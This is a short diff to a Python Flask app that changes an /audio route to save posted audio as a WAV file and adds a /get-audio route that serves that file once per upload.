@@ -1,6 +1,6 @@
 import os
 from time import time
-from flask import Flask, render_template, request, redirect, jsonify, Response
+from flask import Flask, render_template, request, redirect, jsonify, Response, send_file
 from datetime import datetime
 import base64
 import json
@@ -518,15 +518,24 @@ def cmd():
 @app.route("/audio",methods=["GET","POST"])
 def audio():
 	global send
-	res = Response("data: none\n\n", mimetype='text/event-stream') 
+	send = False
 	if request.method == "POST":
 		with open(os.path.join(STATIC_FOLDER,"mic","audio.wav"),"wb") as file:
 			file.write(request.data)
-			send = "play"
-			res = Response("data: {send}\n\n", mimetype='text/event-stream') 
-			send = "none"
-	return res if request.method == "GET" else "stored"
-		
+			send = True
+	return "done"
+	
+@app.route("/get-audio",methods=["GET","POST"])
+def get_audio():
+		global send
+		def req(response):
+			global send
+			send = False
+			return response
+		if send:
+			return req(send_file("/static/mic/audio.wav"))
+		else:
+			return "none"
 @app.route("/upload-files",methods=["POST", "GET"])
 def upload_files():
 	if request.method == "POST":
